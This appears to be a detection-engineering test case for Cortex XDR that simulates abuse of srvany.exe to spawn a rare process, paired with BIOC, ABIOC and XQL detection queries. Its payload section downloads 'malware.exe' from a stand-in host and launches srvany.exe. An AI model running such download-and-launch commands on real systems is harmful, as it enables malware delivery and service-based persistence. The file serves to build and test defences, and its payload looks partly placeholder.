identity.name: Rare Process Spawned by srvany.exe
identity.summary: An attacker uses srvany.exe to execute a malicious process, which triggers a detection for rare process spawning behavior. Cortex should detect this unusual execution chain.
identity.description: An attacker uses srvany.exe to execute a malicious process, which triggers a detection for rare process spawning behavior. Cortex should detect this unusual execution chain.

payload.code:
cd C:\Windows\Temp
wget https://example.com/malware.exe -OutFile malware.exe
stub malware.exe
$proc = Start-Process -FilePath "C:\Windows\System32\srvany.exe" -ArgumentList "-i" -PassThru
Start-Sleep -Seconds 5

expected_artifacts.description: srvany.exe started with command line arguments

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rare process spawned by srvany.exe
biocs.description: Detection of a process launched directly by srvany.exe, which is not typical behavior
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name = 'srvany.exe'
| filter action_process_image_name != 'cmd.exe' and action_process_image_name != 'powershell.exe'
| filter not action_file_path contains 'Windows\\System32\\'

abiocs.name: Unusual Process Launch from srvany.exe
abiocs.description: Detection of a non-standard process being launched from srvany.exe, indicating potential abuse of the service wrapper
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name = 'srvany.exe'
| filter not action_process_image_name in ('cmd.exe', 'powershell.exe', 'wmic.exe')

xql_queries.name: Detect srvany.exe launching non-standard processes
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter causality_actor_process_image_name = 'srvany.exe'
| filter not action_process_image_name in ('cmd.exe', 'powershell.exe', 'wmic.exe')
| fields actor_process_image_name, action_process_image_name, causality_actor_process_image_name
